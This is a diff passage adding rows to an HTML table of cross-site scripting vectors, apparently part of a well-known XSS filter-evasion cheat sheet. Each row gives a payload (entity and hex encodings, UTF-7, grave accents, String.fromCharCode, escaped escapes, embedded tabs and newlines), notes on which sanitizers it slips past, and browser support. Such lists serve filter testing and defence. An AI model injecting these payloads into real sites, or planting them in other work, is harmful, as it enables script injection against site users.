+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Other Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;BR SIZE="&amp;{alert('XSS')}"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&JavaScript includes (works in Netscape 4.x).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="ns"&gt;IE6.0&lt;/span&gt;|&lt;span class="ns"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;] [&lt;span class="s"&gt;NS4&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Character Encoding Example</td>
+	<td width="10%"><div align="right"><input id="link56" type="button" value="[+] Expand" onClick="toggle_visibility('table56','link56');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table56" name="table56">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Character Encoding Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;
+%3C
+&amp;lt
+&amp;lt;
+&amp;LT
+&amp;LT;
+&amp;#60
+&amp;#060
+&amp;#0060
+
+&amp;#00060
+&amp;#000060
+&amp;#0000060
+&amp;#60;
+&amp;#060;
+&amp;#0060;
+&amp;#00060;
+&amp;#000060;
+&amp;#0000060;
+&amp;#x3c
+&amp;#x03c
+&amp;#x003c
+&amp;#x0003c
+&amp;#x00003c
+&amp;#x000003c
+&amp;#x3c;
+&amp;#x03c;
+
+&amp;#x003c;
+&amp;#x0003c;
+&amp;#x00003c;
+&amp;#x000003c;
+&amp;#X3c
+&amp;#X03c
+&amp;#X003c
+&amp;#X0003c
+&amp;#X00003c
+&amp;#X000003c
+&amp;#X3c;
+&amp;#X03c;
+&amp;#X003c;
+&amp;#X0003c;
+&amp;#X00003c;
+&amp;#X000003c;
+&amp;#x3C
+
+&amp;#x03C
+&amp;#x003C
+&amp;#x0003C
+&amp;#x00003C
+&amp;#x000003C
+&amp;#x3C;
+&amp;#x03C;
+&amp;#x003C;
+&amp;#x0003C;
+&amp;#x00003C;
+&amp;#x000003C;
+&amp;#X3C
+&amp;#X03C
+&amp;#X003C
+&amp;#X0003C
+&amp;#X00003C
+&amp;#X000003C
+
+&amp;#X3C;
+&amp;#X03C;
+&amp;#X003C;
+&amp;#X0003C;
+&amp;#X00003C;
+&amp;#X000003C;
+\x3c
+\x3C
+\u003c
+\u003C</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">All of the possible combinations of the character "&lt;" in HTML and JavaScript.  Most of these won't render, but many of them can get rendered in certain circumstances (standards are great, aren't they?).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support:</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Case Insensitive</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link57" type="button" value="[+] Expand" onClick="toggle_visibility('table57','link57');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table57" name="table57">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Character Encoding Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Case insensitive XSS attack vector.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant HTML Entities</td>
+	<td width="10%"><div align="right"><input id="link58" type="button" value="[+] Expand" onClick="toggle_visibility('table58','link58');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table58" name="table58">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Character Encoding Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML entities (the semicolons are required for this to work).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Grave Accents</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link59" type="button" value="[+] Expand" onClick="toggle_visibility('table59','link59');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table59" name="table59">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Character Encoding Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Grave accent obfuscation (If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Image w/CharCode</td>
+	<td width="10%"><div align="right"><input id="link60" type="button" value="[+] Expand" onClick="toggle_visibility('table60','link60');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table60" name="table60">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Character Encoding Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">If no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant UTF-8 Unicode Encoding</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link61" type="button" value="[+] Expand" onClick="toggle_visibility('table61','link61');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table61" name="table61">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Character Encoding Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">UTF-8 Unicode encoding (all of the XSS examples that use a javascript: directive inside of an IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Long UTF-8 Unicode w/out Semicolons</td>
+	<td width="10%"><div align="right"><input id="link62" type="button" value="[+] Expand" onClick="toggle_visibility('table62','link62');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table62" name="table62">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Character Encoding Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Long UTF-8 Unicode encoding without semicolons (this is often effective in XSS that attempts to look for "&amp;#XX;", since most people don't know about padding - up to 7 numeric characters total).  This is also useful against people who decode against strings like $tmp_string =~ s/.*\&amp;#(\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate an html encoded string (I've seen this in the wild).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant DIV w/Unicode</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link63" type="button" value="[+] Expand" onClick="toggle_visibility('table63','link63');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table63" name="table63">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Character Encoding Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">DIV background-image with unicoded XSS exploit (this has been modified slightly to obfuscate the url parameter).  The original vulnerability was found by Renaud Lifchitz (http://www.sysdream.com) as a vulnerability in Hotmail.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Hex Encoding w/out Semicolons</td>
+	<td width="10%"><div align="right"><input id="link64" type="button" value="[+] Expand" onClick="toggle_visibility('table64','link64');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table64" name="table64">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Character Encoding Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Hex encoding without semicolons (this is also a viable XSS attack against the above string $tmp_string = ~ s/.*\&#(\d+);.*/$1/; which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant UTF-7 Encoding</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link65" type="button" value="[+] Expand" onClick="toggle_visibility('table65','link65');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table65" name="table65">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Character Encoding Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">UTF-7 encoding - if the page that the XSS resides on doesn't provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to Roman Ivanov http://www.pixel-apes.com/ for this one). You don't need the charset statement if the user's browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 IE rendering engine mode). Watchfire  http://seclists.org/lists/fulldisclosure/2005/Dec/1107.html found this hole in Google's custom 404 script.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Escaping JavaScript escapes</td>
+	<td width="10%"><div align="right"><input id="link66" type="button" value="[+] Expand" onClick="toggle_visibility('table66','link66');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table66" name="table66">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Character Encoding Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">\";alert('XSS');//</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Escaping JavaScript escapes. When the application is written to output some user information inside of a JavaScript like the following: &lt;SCRIPT&gt;var a="$ENV{QUERY_STRING}";&lt;/SCRIPT&gt; and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this is gets injected it will read &lt;SCRIPT&gt;var a="";alert('XSS');//";&lt;/SCRIPT&gt; which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant End title tag</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link67" type="button" value="[+] Expand" onClick="toggle_visibility('table67','link67');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table67" name="table67">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Character Encoding Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">This is a simple XSS vector that closes TITLE tags, which can encapsulate the malicious cross site scripting attack.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant STYLE w/broken up JavaScript</td>
+	<td width="10%"><div align="right"><input id="link68" type="button" value="[+] Expand" onClick="toggle_visibility('table68','link68');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table68" name="table68">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Character Encoding Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">STYLE tags with broken up JavaScript for XSS (this XSS at times sends IE into an infinite loop of alerts).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Embedded Tab</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link69" type="button" value="[+] Expand" onClick="toggle_visibility('table69','link69');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table69" name="table69">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded Character Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG SRC="jav	ascript:alert('XSS');"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded tab to break up the cross site scripting attack.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Embedded Encoded Tab</td>
+	<td width="10%"><div align="right"><input id="link70" type="button" value="[+] Expand" onClick="toggle_visibility('table70','link70');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table70" name="table70">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded Character Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded encoded tab to break up XSS.  For some reason Opera does not allow the encoded tab, but it does allow the previous tab XSS and encoded newline and carriage returns below.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Embedded Newline</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link71" type="button" value="[+] Expand" onClick="toggle_visibility('table71','link71');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table71" name="table71">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded Character Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded newline to break up XSS. Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Embedded Carriage Return</td>
+	<td width="10%"><div align="right"><input id="link72" type="button" value="[+] Expand" onClick="toggle_visibility('table72','link72');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table72" name="table72">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
